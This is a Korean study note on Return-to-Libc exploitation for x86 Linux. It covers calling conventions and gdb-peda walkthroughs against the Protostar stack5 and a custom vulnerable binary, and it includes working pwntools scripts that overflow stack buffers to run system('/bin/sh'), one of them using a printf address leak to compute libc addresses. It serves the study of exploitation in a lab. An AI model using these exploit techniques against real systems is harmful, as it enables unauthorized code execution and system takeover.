# 02. Return to Libc(x86)
* 리턴어드레스를 공유 라이브러리(Libc) 함수의 주소로 변경하여, 해당 함수 호출
  * 일반적으로 system 함수를 호출하여 /bin/sh를 실행하는 방법 사용
* NX bit(DEP)를 우회하는 데 사용



## (1) 선행지식. Calling Convention
* 리눅스에서는 Cdecl 호출 규약을 사용
* x86과 x64가 다름: x86은 스택에, x64는 레지스터를 이용하다가 스택을 이용

#### x86

* 함수 인자값을 스택에 저장/ 오른쪽에서 왼쪽 순으로 스택에 쌓임

* 함수 리턴값은  eax 레지스터에 저장

* 스택정리는 호출한 함수가 담당(호출된 함수 아님)

  ```c
  #include<stdio.h>

  void function(int a, int b, int c, int d, int e, int f, int g, int h){
    printf("%d %d %d %d %d %d %d %d", a, b, c, d, e, f, g, h);
  }
  void main(){
    function(1,2,3,4,5,6,7,8);
  }
  ```

  ```shell
     0x080491c0 <+27>:	push   0x8
     0x080491c2 <+29>:	push   0x7
     0x080491c4 <+31>:	push   0x6
     0x080491c6 <+33>:	push   0x5
     0x080491c8 <+35>:	push   0x4
     0x080491ca <+37>:	push   0x3
     0x080491cc <+39>:	push   0x2
     0x080491ce <+41>:	push   0x1
     0x080491d0 <+43>:	call   0x8049162 <function>
  ```

* 스택에 함수의 인자값을 오른쪽부터(8,7,6...1) 넣고 함수를 호출함을 알 수 있음

* 인자를 넣고 함수를 호출하므로 아래와 같은 메모리 구조를 갖게 됨

  ```
  (높)-----------------
  	   인자
      -----------------
  	함수종료후 돌아갈 RET
  (낮)------------------
  ```

* 호출된 함수에서 인자값 사용은 아래와 같이 진행됨

  ```
     0x08049176 <+20>:	push   DWORD PTR [ebp+0x24]
     0x08049179 <+23>:	push   DWORD PTR [ebp+0x20]
     0x0804917c <+26>:	push   DWORD PTR [ebp+0x1c]
     0x0804917f <+29>:	push   DWORD PTR [ebp+0x18]
     0x08049182 <+32>:	push   DWORD PTR [ebp+0x14]
     0x08049185 <+35>:	push   DWORD PTR [ebp+0x10]
     0x08049188 <+38>:	push   DWORD PTR [ebp+0xc]
     0x0804918b <+41>:	push   DWORD PTR [ebp+0x8]
  ```

* ebp+0x8부터 인자가 저장되어 있음을 확인할 수 있다.

* ebp+0x4는 해당함수 종료후 돌아갈 리턴어드레스가 저장된다.  

* ebp에는 이전 호출 프레임이 저장되어 있다.



#### X64

* 레지스트리에 6개까지 저장한 후 이후는 스택에 저장

* edi, esi, edx, ecx, r8d, r9d 순으로 매칭

  ```
     0x000000000040117e <+0>:	push   rbp
     0x000000000040117f <+1>:	mov    rbp,rsp
     0x0000000000401182 <+4>:	push   0x8
     0x0000000000401184 <+6>:	push   0x7
     0x0000000000401186 <+8>:	mov    r9d,0x6
     0x000000000040118c <+14>:	mov    r8d,0x5
     0x0000000000401192 <+20>:	mov    ecx,0x4
     0x0000000000401197 <+25>:	mov    edx,0x3
     0x000000000040119c <+30>:	mov    esi,0x2
     0x00000000004011a1 <+35>:	mov    edi,0x1
     0x00000000004011a6 <+40>:	call   0x401122 <function>
     0x00000000004011ab <+45>:	add    rsp,0x10
     0x00000000004011af <+49>:	nop
     0x00000000004011b0 <+50>:	leave
     0x00000000004011b1 <+51>:	ret
  ```

* 레지스트리와 스택에 인자값을 넣은 후 function을 call하면서 종료후 복귀할 주소인 0x4011ab를 ret로 스택에 넣음

* function에서 push rbp로 이전 호출 프레임 넣음

  ```
  gdb-peda$ i r $rbp
  rbp            0x7fffffffe4a0	0x7fffffffe4a0
  gdb-peda$ conti
  ```



* 따라서 아래와 같은 스택 모양이 만들어짐

  ```
  (높)------------------
     8
  ----------------------
     7
  ----------------------
     ret(0x4011ab)
  ----------------------
     rbp(0x7fffffffe4a0)
  (낮)------------------
  ```

* x64는 ROP로 공격해야함



## (2) 공격 설명

* 함수를 호출하면 ret 뒤 4바이트에 인자가 들어감

* 만약 시스템 함수를 ret 조작을 통해 호출하면 시스템함수 종료후 돌아갈 주소 ret가 스택에 삽입되고 이 ret의 4바이트 뒤, 즉 조작된 ret의 8바이트 뒤에 인자값을 넣어야함

  ```
  (높)------------------
     "/bin/sh"
     -------------------
     system 함수 종료후 ret
     -------------------
     ret -> system 함수주소
  (낮)-------------------

  ```

### PoC #1

* protostar stack5 바이너리 이용(Protostar/bin)

##### 1) gdb-peda이용

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

```shell
gdb-peda$ disass main
Dump of assembler code for function main:
   0x080483c4 <+0>:	push   ebp
   0x080483c5 <+1>:	mov    ebp,esp
   0x080483c7 <+3>:	and    esp,0xfffffff0
   0x080483ca <+6>:	sub    esp,0x50
   0x080483cd <+9>:	lea    eax,[esp+0x10]
   0x080483d1 <+13>:	mov    DWORD PTR [esp],eax
   0x080483d4 <+16>:	call   0x80482e8 <gets@plt>
   0x080483d9 <+21>:	leave
   0x080483da <+22>:	ret
End of assembler dump.
gdb-peda$ b *main+22
Breakpoint 1 at 0x80483da: file stack5/stack5.c, line 11.
gdb-peda$ pattern create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
gdb-peda$ r
Starting program: /root/Study/LinuxExTech/02.ReturnToLibc/stack5
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL
gdb-peda$ x/s $esp
0xffffd5ec:	"AA4AAJAAfAA5AAKAAgAA6AAL"
gdb-peda$ pattern offset AA4AAJAAfAA5AAKAAgAA6AAL
AA4AAJAAfAA5AAKAAgAA6AAL found at offset: 76
gdb-peda$
gdb-peda$ p system
$1 = {<text variable, no debug info>} 0xf7e09980 <system>
gdb-peda$ find '/bin/sh'
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0xf7f49aaa ("/bin/sh")
```

```python
root@attacker:~/Study/LinuxExTech/02.ReturnToLibc# cat ex_rtl1_32.py
from pwn import *

OFFSET = 76

dummy = p32(0xffffffff)
system = p32(0xf7e09980)
binsh = p32(0xf7f49aaa)

p = process(['stack5'])

payload = "A" * OFFSET + system + dummy + binsh

p.sendline(payload)
p.interactive()
```



##### 2) manual

* 추후 추가

### PoC #2

```c
//32bit: gcc -m32 -w -no-pie -fno-stack-protector -o rtl2_32 rtl2.c -ldl
//
#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <dlfcn.h>

void vuln(){
    char buf[50] = "";
    void (*printf_addr)() = dlsym(RTLD_NEXT, "printf");
    printf("Printf() address : %p\n",printf_addr);
    read(0, buf, 100);
}

void main(){
    vuln();
}
```

* 디버깅
  * vuln함수 시작(vuln+0 ): esp에서 바로 ret 확인 가능,  esp주소 기억
  * read함수 콜(vuln+123) :
    * read(0,buf,100)이므로 read함수 콜할 때 두번째 인자값에 buf의 주소가 있음
    * buf주소 - 이전 esp주소 = 덮어쓸 길이
  * vuln함수 리턴(vuln+139): 덮어졌는지 확인 가능

```
root@attacker:~/Study/LinuxExTech/02.ReturnToLibc# gdb -q rtl2_32
Reading symbols from rtl2_32...(no debugging symbols found)...done.
gdb-peda$ disass main
Dump of assembler code for function main:
   0x0804920e <+0>:	push   ebp
   0x0804920f <+1>:	mov    ebp,esp
   0x08049211 <+3>:	and    esp,0xfffffff0
   0x08049214 <+6>:	call   0x8049226 <__x86.get_pc_thunk.ax>
   0x08049219 <+11>:	add    eax,0x2de7
   0x0804921e <+16>:	call   0x8049182 <vuln>
   0x08049223 <+21>:	nop
   0x08049224 <+22>:	leave
   0x08049225 <+23>:	ret
End of assembler dump.
gdb-peda$ disass vuln
Dump of assembler code for function vuln:
   0x08049182 <+0>:	push   ebp
   0x08049183 <+1>:	mov    ebp,esp
   0x08049185 <+3>:	push   edi
   0x08049186 <+4>:	push   esi
   0x08049187 <+5>:	push   ebx
   0x08049188 <+6>:	sub    esp,0x4c
   0x0804918b <+9>:	call   0x80490c0 <__x86.get_pc_thunk.bx>
   0x08049190 <+14>:	add    ebx,0x2e70
   0x08049196 <+20>:	mov    DWORD PTR [ebp-0x4e],0x0
   0x0804919d <+27>:	lea    eax,[ebp-0x4a]
   0x080491a0 <+30>:	mov    ecx,0x2e
   0x080491a5 <+35>:	mov    esi,0x0
   0x080491aa <+40>:	mov    DWORD PTR [eax],esi
   0x080491ac <+42>:	mov    DWORD PTR [eax+ecx*1-0x4],esi
   0x080491b0 <+46>:	lea    edx,[eax+0x4]
   0x080491b3 <+49>:	and    edx,0xfffffffc
   0x080491b6 <+52>:	sub    eax,edx
   0x080491b8 <+54>:	add    ecx,eax
   0x080491ba <+56>:	and    ecx,0xfffffffc
   0x080491bd <+59>:	shr    ecx,0x2
   0x080491c0 <+62>:	mov    edi,edx
   0x080491c2 <+64>:	mov    eax,esi
   0x080491c4 <+66>:	rep stos DWORD PTR es:[edi],eax
   0x080491c6 <+68>:	sub    esp,0x8
   0x080491c9 <+71>:	lea    eax,[ebx-0x1ff8]
   0x080491cf <+77>:	push   eax
   0x080491d0 <+78>:	push   0xffffffff
   0x080491d2 <+80>:	call   0x8049060 <dlsym@plt>
   0x080491d7 <+85>:	add    esp,0x10
   0x080491da <+88>:	mov    DWORD PTR [ebp-0x1c],eax
   0x080491dd <+91>:	sub    esp,0x8
   0x080491e0 <+94>:	push   DWORD PTR [ebp-0x1c]
   0x080491e3 <+97>:	lea    eax,[ebx-0x1ff1]
   0x080491e9 <+103>:	push   eax
   0x080491ea <+104>:	call   0x8049040 <printf@plt>
   0x080491ef <+109>:	add    esp,0x10
   0x080491f2 <+112>:	sub    esp,0x4
   0x080491f5 <+115>:	push   0x64
   0x080491f7 <+117>:	lea    eax,[ebp-0x4e]
   0x080491fa <+120>:	push   eax
   0x080491fb <+121>:	push   0x0
   0x080491fd <+123>:	call   0x8049030 <read@plt>
   0x08049202 <+128>:	add    esp,0x10
   0x08049205 <+131>:	nop
   0x08049206 <+132>:	lea    esp,[ebp-0xc]
   0x08049209 <+135>:	pop    ebx
   0x0804920a <+136>:	pop    esi
   0x0804920b <+137>:	pop    edi
   0x0804920c <+138>:	pop    ebp
   0x0804920d <+139>:	ret
End of assembler dump.
gdb-peda$ b *vuln+0
Breakpoint 1 at 0x8049182
gdb-peda$ b *vuln+123
Breakpoint 2 at 0x80491fd
gdb-peda$ b *vuln+139
Breakpoint 3 at 0x804920d
gdb-peda$ info b
Num     Type           Disp Enb Address    What
1       breakpoint     keep y   0x08049182 <vuln>
2       breakpoint     keep y   0x080491fd <vuln+123>
3       breakpoint     keep y   0x0804920d <vuln+139>
gdb-peda$
```

* vuln+0

  * esp: 0xffffd5dc ->ret 가 담긴 주소
  * ret: 0x08049223 -> main+23

* ```bash
  Breakpoint 1, 0x08049182 in vuln ()
  gdb-peda$ i r $esp
  esp            0xffffd5dc	0xffffd5dc
  gdb-peda$ x/2wx $esp
  0xffffd5dc:	0x08049223	0xf7f9f000
  gdb-peda$
  ```

* vuln+123

  ```
  gdb-peda$ conti
  Continuing.
  Printf() address : 0xf7e178c0
  gdb-peda$ x/2wx $esp
  0xffffd570:	0x00000000	0xffffd58a
  gdb-peda$ p/d 0xffffd5dc - 0xffffd58a
  $5 = 82
  ```

* vuln+139

  * 82개문자+ABCD 삽입하여 확인

  ```
  gdb-peda$ conti
  Continuing.
  AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJABCD
  Stopped reason: SIGSEGV
  0x44434241 in ?? ()
  ```

* 오프셋 확인

  * printf: 0x528c0
  * system: 0x3e980

  ```
  gdb-peda$ print system
  $6 = {<text variable, no debug info>} 0xf7e03980 <system>
  gdb-peda$ print printf
  $7 = {<text variable, no debug info>} 0xf7e178c0 <printf>
  gdb-peda$ info proc map
  process 19033
  Mapped address spaces:

  	Start Addr   End Addr       Size     Offset objfile
  	 0x8048000  0x8049000     0x1000        0x0 /root/Study/LinuxExTech/02.ReturnToLibc/rtl2_32
  	 0x8049000  0x804a000     0x1000     0x1000 /root/Study/LinuxExTech/02.ReturnToLibc/rtl2_32
  	 0x804a000  0x804b000     0x1000     0x2000 /root/Study/LinuxExTech/02.ReturnToLibc/rtl2_32
  	 0x804b000  0x804c000     0x1000     0x2000 /root/Study/LinuxExTech/02.ReturnToLibc/rtl2_32
  	 0x804c000  0x804d000     0x1000     0x3000 /root/Study/LinuxExTech/02.ReturnToLibc/rtl2_32
  	0xf7dc5000 0xf7dde000    0x19000        0x0 /usr/lib32/libc-2.28.so
  	0xf7dde000 0xf7f2c000   0x14e000    0x19000 /usr/lib32/libc-2.28.so
  	0xf7f2c000 0xf7f9c000    0x70000   0x167000 /usr/lib32/libc-2.28.so
  	0xf7f9c000 0xf7f9d000     0x1000   0x1d7000 /usr/lib32/libc-2.28.so
  	0xf7f9d000 0xf7f9f000     0x2000   0x1d7000 /usr/lib32/libc-2.28.so
  	0xf7f9f000 0xf7fa0000     0x1000   0x1d9000 /usr/lib32/libc-2.28.so
  	0xf7fa0000 0xf7fa3000     0x3000        0x0
  .....
  	0xf7fcd000 0xf7fcf000     0x2000        0x0
  	0xf7fcf000 0xf7fd2000     0x3000        0x0 [vvar]
  	0xf7fd2000 0xf7fd4000     0x2000        0x0 [vdso]
  	0xf7fd4000 0xf7fd5000     0x1000        0x0 /usr/lib32/ld-2.28.so
  	0xf7fd5000 0xf7ff1000    0x1c000     0x1000 /usr/lib32/ld-2.28.so
  	0xf7ff1000 0xf7ffb000     0xa000    0x1d000 /usr/lib32/ld-2.28.so
  	0xf7ffc000 0xf7ffd000     0x1000    0x27000 /usr/lib32/ld-2.28.so
  	0xf7ffd000 0xf7ffe000     0x1000    0x28000 /usr/lib32/ld-2.28.so
  	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
  gdb-peda$ p/x 0xf7e178c0 - 0xf7dc5000
  $8 = 0x528c0
  gdb-peda$ p/x 0xf7e03980 - 0xf7dc5000
  $9 = 0x3e980
  gdb-peda$
  ```


* /bin/sh 주소 확인

  * 주소: 0xf7f43aaa
  * 오프셋: 0x17eaaa

  ```
  gdb-peda$ find "/bin/sh"
  Searching for '/bin/sh' in: None ranges
  Found 1 results, display max 1 items:
  libc : 0xf7f43aaa ("/bin/sh")
  gdb-peda$ p/x 0xf7f43aaa - 0xf7dc5000
  $10 = 0x17eaaa
  ```

* exploit 작성

* ```python
  # simple
  from pwn import *

  p = process(['./rtl2_32'])

  system = p32(0xf7e03980)
  binsh = p32(0xf7f43aaa)
  dummy = p32(0xffffffff)
  OFFSET = 82

  payload = "A"*82 + system + dummy + binsh
  p.sendline(payload)
  p.interactive()
  ```

  ```python
  # offset이용
  from pwn import *

  p = process(['./rtl2_32'])

  p.recvuntil('Printf() address : ')
  printf = p.recvuntil('\n')
  printf = int(printf,16)

  libcbase = printf - 0x528c0
  system = libcbase + 0x3e980
  binsh = libcbase + 0x17eaaa

  system = p32(system)
  binsh = p32(binsh)
  dummy = p32(0xffffffff)
  OFFSET = 82

  payload = "A"*82 + system + dummy + binsh
  p.sendline(payload)
  p.interactive()

  ```
